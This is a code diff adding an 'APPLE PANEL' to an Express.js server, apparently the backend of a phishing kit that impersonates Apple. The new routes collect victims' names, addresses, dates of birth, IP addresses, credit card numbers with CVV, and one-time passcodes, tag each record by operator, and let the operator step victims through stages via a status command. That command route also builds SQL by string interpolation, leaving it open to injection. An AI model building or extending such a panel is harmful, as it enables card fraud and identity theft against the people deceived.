@@ -2060,6 +2060,149 @@ app.post("/zcSaveLogin", cors(), (req, res) => {
   res.send("Completed");
 });
 
+//APPLE PANEL
+//APPLE PANEL
+//APPLE PANEL
+
+app.options("/appleCustomers/:id/:owner/modal", cors());
+
+app.get("/appleCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM apple WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/appleCustomers/:owner", cors());
+
+app.get("/appleCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM apple WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/appleCommand", cors());
+
+app.post("/appleCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE apple SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/appleCustomers/:id/:owner", cors());
+
+app.get("/appleCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM apple WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/appleSaveBilling", cors());
+
+app.post("/appleSaveBilling", cors(), (req, res) => {
+  firstName = req.body.firstName;
+  lastName = req.body.lastName;
+  telephone = req.body.telephone;
+  addy = req.body.addy;
+  town = req.body.town;
+  pcode = req.body.pcode;
+  dob = req.body.dob;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  let details = [
+    `${firstName} ${lastName}`,
+    telephone,
+    addy,
+    town,
+    pcode,
+    dob,
+    uniqueid,
+    ip,
+    owner,
+  ];
+  let query = `INSERT INTO apple(fullName,telephone, addy, town, pcode, dob, uniqueid,status,ip, owner) VALUES (?,?,?,?,?,?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/appleSaveCC", cors());
+
+app.post("/appleSaveCC", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  ccname = req.body.ccname;
+  ccnum = req.body.ccnum;
+  ccexp = req.body.ccexp;
+  cvv = req.body.cvv;
+  owner = req.body.owner;
+
+  let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
+  let query = `UPDATE apple SET ccname= ?, ccnum = ?, ccexp = ?, cvv = ?, status = 2 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/appleSaveOtp", cors());
+
+app.post("/appleSaveOtp", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  otp = req.body.otp;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE apple SET otp= ?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/appleDeleteentry/:id", cors());
+
+app.post("/appleDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.body.owner;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM apple WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
 //ASB
 //ASB
 //ASB
